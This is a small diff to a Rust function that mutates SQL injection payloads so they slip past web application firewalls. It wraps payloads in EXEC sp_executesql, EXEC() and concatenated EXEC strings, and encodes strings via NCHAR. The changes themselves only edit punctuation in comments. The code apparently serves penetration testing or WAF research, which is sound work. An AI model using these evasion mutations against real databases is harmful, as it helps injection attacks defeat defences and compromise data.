@@ -22,10 +22,10 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     }
 
     // ── Dynamic SQL via EXEC ──
-    // WAFs can't analyze the string inside EXEC — defeats static inspection
+    // WAFs can't analyze the string inside EXEC, defeats static inspection
     results.push(format!("EXEC sp_executesql N'{payload}'"));
     results.push(format!("EXEC('{payload}')"));
-    // Concatenated EXEC — even harder to detect
+    // Concatenated EXEC, even harder to detect
     if lower.contains("select") {
         let parts: Vec<&str> = payload.splitn(2, "SELECT").collect();
         if parts.len() == 2 {
@@ -87,7 +87,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     }
 
     // ── Unicode string via NCHAR ──
-    // Build string from NCHAR values — invisible to keyword filters
+    // Build string from NCHAR values, invisible to keyword filters
     if let Some(start) = payload.find('\'')
         && let Some(end) = payload[start + 1..].find('\'')
     {
